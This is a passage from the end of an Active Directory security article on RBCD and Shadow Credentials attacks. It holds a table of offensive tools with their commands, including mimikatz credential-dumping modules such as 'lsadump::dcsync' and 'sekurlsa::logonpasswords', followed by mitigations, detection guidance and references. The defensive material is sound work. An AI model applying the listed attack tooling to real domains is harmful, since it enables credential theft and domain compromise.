| `PowerMad` | Machine account manipulation | `New-MachineAccount`, `-Password` | [PowerMad](https://github.com/Kevin-Robertson/Powermad) |
| `PowerView` | AD enumeration and ACL abuse | `Find-InterestingDomainAcl`, `Set-DomainObject`, `Get-DomainComputer` | [PowerView](https://github.com/PowerShellMafia/PowerSploit) |
| `StandIn` | .NET AD post-exploitation | `--computer`, `--delegation`, `--sid` | [StandIn](https://github.com/FuzzySecurity/StandIn) |
| `Whisker` | Manage Shadow Credentials (msDS-KeyCredentialLink) | `add`, `remove`, `list`, `/target`, `/deviceid` | [Whisker](https://github.com/eladshamir/Whisker) |
| `KrbRelayUp` | Local privilege escalation via Kerberos relay | `relay`, `spawn`, `full`, `-m rbcd/shadowcred`, `-c`, `-cn`, `-cp` | [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) |
| `DavRelayUp` | Local privilege escalation via WebDAV relay | `-c`, `-cn`, `-cp` | [DavRelayUp](https://github.com/Dec0ne/DavRelayUp) |
| `SharpAllowedToAct` | Set RBCD permissions | `-m`, `-t`, `-a` | [SharpAllowedToAct](https://github.com/pkb1s/SharpAllowedToAct) |
| `Certify` | AD CS enumeration and abuse | `find`, `request`, `/ca`, `/template` | [Certify](https://github.com/GhostPack/Certify) |
| `mimikatz` | Credential extraction and manipulation | `lsadump::dcsync`, `kerberos::ptt`, `sekurlsa::logonpasswords` | [mimikatz](https://github.com/gentilkiwi/mimikatz) |
| `SCMUACBypass` | SCM UAC bypass for SYSTEM shell | Used after S4U2Self ticket import | [SCMUACBypass](https://github.com/tyranid/SCMUACBypass) |

---

## Mitigations and Defenses

### 1. Set MachineAccountQuota to 0

This prevents regular users from creating machine accounts, eliminating the most common RBCD primitive.

```powershell
PS C:\Tools> Set-ADDomain -Identity "INLANEFREIGHT.LOCAL" -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

> Setting MAQ to 0 does NOT fully prevent RBCD attacks. Attackers can still use compromised existing machine accounts (Scenario 4) or the SPN-less U2U technique (Scenario 5).
{: .prompt-warning }

### 2. Enforce LDAP Signing and Channel Binding

LDAP signing prevents relay attacks to LDAP. Channel binding (Extended Protection for Authentication / EPA) prevents relay to LDAPS.

**Group Policy:**
- `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`
  - `Domain controller: LDAP server signing requirements` → **Require signing**
  - `Domain controller: LDAP server channel binding token requirements` → **Always**

### 3. Enable Extended Protection for Authentication (EPA)

EPA adds channel binding tokens to authentication, preventing cross-protocol relay attacks. Enable it on all IIS/HTTP services, AD FS, and LDAPS.

### 4. Protected Users Group

Add high-value accounts to the `Protected Users` group. This group provides:
- Cannot use NTLM, Digest, or CredSSP authentication
- Kerberos will not use DES or RC4 for pre-authentication
- Account cannot be delegated (neither constrained nor unconstrained)
- TGT lifetime reduced to 4 hours

> The `Protected Users` group can be bypassed by the **Bronze Bit attack (CVE-2020-17049)** on unpatched systems. Ensure all DCs are patched.
{: .prompt-danger }

### 5. "Account is sensitive and cannot be delegated" Flag

For accounts that cannot be added to Protected Users (e.g., service accounts that need NTLM), set the "Account is sensitive and cannot be delegated" flag:

```powershell
PS C:\Tools> Set-ADAccountControl -Identity 'svc_admin' -AccountNotDelegated $true
```

### 6. Monitor msDS-AllowedToActOnBehalfOfOtherIdentity Changes

Set up audit rules to alert on modifications to this attribute:

- **Event ID 5136** — Directory Service Changes audit
- Create a custom detection rule for changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Alert on any modification outside of change management windows

### 7. Monitor msDS-KeyCredentialLink Changes

Similarly, monitor for Shadow Credential additions:

- **Event ID 5136** — Filter for `msDS-KeyCredentialLink` modifications
- Baseline legitimate WHfB key registrations
- Alert on unexpected key additions, especially to computer accounts or admin users

### 8. Disable Unnecessary Services

**Print Spooler Service:**
```powershell
PS C:\Tools> Stop-Service -Name Spooler
PS C:\Tools> Set-Service -Name Spooler -StartupType Disabled
```

**WebClient Service:**
```powershell
PS C:\Tools> Stop-Service -Name WebClient
PS C:\Tools> Set-Service -Name WebClient -StartupType Disabled
```

> The Print Spooler and WebClient services should be disabled on all servers where they are not explicitly required, especially on Domain Controllers.
{: .prompt-tip }

### 9. Enforce SMB Signing

Enforce SMB signing on all machines (not just DCs) to prevent SMB-based relay:

**Group Policy:**
- `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`
  - `Microsoft network server: Digitally sign communications (always)` → **Enabled**
  - `Microsoft network client: Digitally sign communications (always)` → **Enabled**

### Defense Summary Table

| Mitigation | Prevents | Limitation |
|---|---|---|
| MAQ = 0 | Machine account creation | Can use existing compromised machines or U2U |
| LDAP Signing | Relay to LDAP | Does not prevent relay to LDAPS without channel binding |
| LDAP Channel Binding (EPA) | Relay to LDAPS | Must be configured correctly on all endpoints |
| Protected Users | S4U delegation abuse | Bypassed by Bronze Bit on unpatched DCs |
| Sensitive and cannot be delegated | S4U delegation abuse | Same as Protected Users — Bronze Bit bypass |
| Monitor RBCD attribute | Detection of RBCD configuration | Does not prevent — only detects |
| Monitor KeyCredentialLink | Detection of Shadow Credentials | Does not prevent — only detects |
| Disable Print Spooler | PrinterBug/SpoolSample coercion | Other coercion methods exist (PetitPotam, DFSCoerce) |
| Disable WebClient | WebDAV coercion | Only affects HTTP-based coercion |
| SMB Signing | SMB relay attacks | Does not prevent HTTP-based relay |

---

## References

### Research Papers and Blog Posts

- [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) — Elad Shamir (Shenanigans Labs)
- [Exploiting RBCD Using a Normal User](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) — James Forshaw (Google Project Zero)
- [From the Archives: Drop the MIC — CVE-2019-1040](https://www.crowdstrike.com/en-us/blog/from-the-archives-drop-the-mic-cve-2019-1040/) — CrowdStrike
- [Exploiting CVE-2019-1040 — Combining Relay Vulnerabilities for RCE and Domain Admin](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/) — Dirk-jan Mollema
- [CVE-2020-17049: Kerberos Bronze Bit Attack Theory](https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/) — Jake Karnes (NetSPI)
- [Leveraging the Kerberos Bronze Bit Attack](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory) — Trimarc Security
- [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) — Elad Shamir (SpecterOps)
- [No-Fix LPE Using KrbRelay with Shadow Credentials](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html) — icyguider
- [NTLM Relaying Low-Privilege HTTP Auth to LDAP](https://specterops.io/blog/2025/08/22/operating-outside-the-box-ntlm-relaying-low-privilege-http-auth-to-ldap/) — SpecterOps
- [RBCD Resource-Based Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) — The Hacker Recipes
- [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) — The Hacker Recipes
- [Kerberos Deep Dive Part 6 — RBCD](https://www.compass-security.com/fileadmin/Research/Presentations/2025_06_Kerberos_Deep_Dive_P6_RBCD.pdf) — Compass Security
- [Good Fences Make Good Neighbors: New AD Trusts Attack Paths](https://specterops.io/blog/2025/06/25/good-fences-make-good-neighbors-new-ad-trusts-attack-paths-in-bloodhound/) — SpecterOps
- [Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques](https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/) — GuidePoint Security
- [A Low Dive into Kerberos Delegations](https://luemmelsec.github.io/S4fuckMe2selfAndUAndU2proxy-A-low-dive-into-Kerberos-delegations/) — LuemmelSec
- [From User to Domain Admin in 60 Seconds: CVE-2021-42278/CVE-2021-42287](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds) — Fortinet

### Tools

- [Impacket](https://github.com/fortra/impacket) — Fortra (getST.py, rbcd.py, addcomputer.py, ntlmrelayx.py, psexec.py, secretsdump.py)
- [Rubeus](https://github.com/GhostPack/Rubeus) — GhostPack
- [pyWhisker](https://github.com/ShutdownRepo/pywhisker) — Charlie Bromberg (@_nwodtuhs)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) — Dirk-jan Mollema (gettgtpkinit.py, getnthash.py)
- [Whisker](https://github.com/eladshamir/Whisker) — Elad Shamir
- [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) — dec0ne
- [PetitPotam](https://github.com/topotam/PetitPotam) — topotam
- [Coercer](https://github.com/p0dalirius/Coercer) — p0dalirius
- [PowerMad](https://github.com/Kevin-Robertson/Powermad) — Kevin Robertson
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) — CravateRouge
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) — Pennyw0rth
- [Certify](https://github.com/GhostPack/Certify) — GhostPack
- [mimikatz](https://github.com/gentilkiwi/mimikatz) — Benjamin Delpy
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — SpecterOps
- [Responder](https://github.com/lgandx/Responder) — Laurent Gaffié
- [krbrelayx](https://github.com/dirkjanm/krbrelayx) — Dirk-jan Mollema
